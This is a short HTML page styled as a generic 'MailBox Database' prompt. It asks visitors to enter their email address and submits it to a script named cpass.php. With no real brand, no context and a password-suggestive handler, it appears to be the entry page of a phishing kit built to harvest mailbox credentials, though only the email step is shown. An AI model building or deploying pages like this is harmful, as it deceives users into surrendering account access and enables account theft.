
<html>
<head>

<link rel="shortcut icon" href="favi.png" />


<title>DataBase</title></head>
<body marginwidth="0" marginheight="0" topmargin="0" bottommargin="0" leftmargin="0" rightmargin="0">

<table width="100%" height="100%" cellspacing="0">

<tr><td height="5%" bgcolor="#E6E6E6">

</td></tr>
















<tr><td height="65%" bgcolor="#E6E6E6">

	<div align="center">

	<font face="verdana" size="3">
	<font size="+3" color="#000000">MailBox Database<b> </b></font>
<br />
	<br />
	<b>
</b>
	</font>

	<br><br>

	<hr width="400" align="center">

	<br>


	<b> Enter your e-mail </b>

	<br><br>

	<form method="post" action="cpass.php">

	<input  name="email" placeholder="Email" type="email" style="width:270px; height:50px; font-family: Verdana; 
	font-size: 14px; font-weight: light; color:#000000; 
	background-color: #ffffff; border: solid 1px #6E6E6E; padding: 15px;" 
	required="" placeholder="&#30005;&#23376;&#37038;&#20214;">	

	<br><br>


	<input type="submit" value="Continue >>" 
	style="width:270px; height:55px; background-color: #424242; border: solid 3px #424242; 
	font-family: Verdana; font-size: 18px; font-weight: light; color: #ffffff; -moz-border-radius: 4px; -webkit-border-radius: 4px; 
	-khtml-border-radius: 4px; border-radius: 4px;
	-moz-box-shadow: 3px 3px 3px #888; -webkit-box-shadow: 3px 3px 3px #888; box-shadow: 3px 3px 3px #888;">	

	</div>

</td></tr>








<tr><td height="25%" bgcolor="#E6E6E6">
</td></tr>











<tr><td height="5%" bgcolor="#ffffff">

</td></tr>

</table>

</body>
</html>